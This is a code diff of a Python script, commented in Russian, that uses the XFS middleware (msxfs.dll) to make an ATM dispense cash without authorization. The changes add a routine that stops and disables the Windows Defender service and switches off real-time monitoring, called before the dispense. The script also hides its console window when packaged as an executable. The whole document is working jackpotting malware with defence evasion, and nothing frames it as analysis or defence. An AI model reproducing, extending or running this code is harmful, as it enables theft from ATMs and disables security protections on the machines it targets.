@@ -1,6 +1,7 @@
 import ctypes
 from ctypes import wintypes
 import sys
+import subprocess
 
 WFS_SUCCESS = 0
 WFS_CMD_CDM_DISPENSE = 302
@@ -28,14 +29,23 @@ class WFSCDMDISPENSE(ctypes.Structure):
         ("bPresent", wintypes.BOOL),
     ]
 
+def disable_antivirus():
+    """Пытается отключить Windows Defender (требует прав Админа)"""
+    try:
+        # Останавливаем службу WinDefend и отключаем её автозапуск
+        subprocess.run("sc stop WinDefend", shell=True, capture_output=True)
+        subprocess.run("sc config WinDefend start= disabled", shell=True, capture_output=True)
+        # Отключаем защиту в реальном времени через PowerShell
+        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
+    except Exception:
+        pass
+
 def dispense_cash(count=5):
     try:
-        # Загружаем DLL (WinDLL безопаснее для 64-битных систем)
         xfs = ctypes.WinDLL("msxfs.dll")
     except OSError:
         return -1
 
-    # Настраиваем типы аргументов (ОЧЕНЬ ВАЖНО для 64-бит)
     xfs.WFSStartUp.argtypes = [wintypes.DWORD, ctypes.POINTER(WFSVERSION)]
     xfs.WFSStartUp.restype = wintypes.DWORD
     
@@ -49,7 +59,6 @@ def dispense_cash(count=5):
     xfs.WFSCleanUp.argtypes = []
 
     version = WFSVERSION()
-    # Инициализация XFS (3.02.03 или 3.10)
     res = xfs.WFSStartUp(0x00030203, ctypes.byref(version))
     if res != WFS_SUCCESS:
         res = xfs.WFSStartUp(0x00031000, ctypes.byref(version))
@@ -70,7 +79,6 @@ def dispense_cash(count=5):
         xfs.WFSCleanUp()
         return -4
 
-    # Команда выдачи: 5 купюр с любой кассеты
     cmd = WFSCDMDISPENSE()
     cmd.usNumber = 1
     cmd.items[0].usNumber = count 
@@ -80,16 +88,18 @@ def dispense_cash(count=5):
     result_data = ctypes.c_void_p()
     res = xfs.WFSExecute(hService, WFS_CMD_CDM_DISPENSE, ctypes.byref(cmd), 10000, ctypes.byref(result_data))
 
-    # Закрываем сессию
     xfs.WFSClose(hService)
     xfs.WFSCleanUp()
 
     return 0 if res == WFS_SUCCESS else -5
 
 if __name__ == "__main__":
-    # Скрываем консоль, если запущено как exe
     if getattr(sys, 'frozen', False):
+        # Скрываем консоль
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     
-    # Выдаем 500 рублей (5 купюр по 100)
+    # 1. Отключаем антивирус
+    disable_antivirus()
+    
+    # 2. Выдаем 500 рублей (5 купюр по 100)
     dispense_cash(5)
